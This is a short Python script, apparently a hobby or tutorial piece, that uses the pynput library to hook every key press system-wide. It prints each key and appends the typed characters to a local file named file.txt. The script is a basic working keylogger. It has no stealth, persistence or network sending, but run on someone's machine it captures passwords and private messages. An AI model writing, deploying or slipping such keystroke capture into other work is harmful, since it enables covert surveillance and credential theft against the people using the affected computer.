from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("file.txt",'a') as log:
        try:
            char = key.char
            log.write(char)
        except:
            print("error getting character.")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)

    listener.start()
    input()

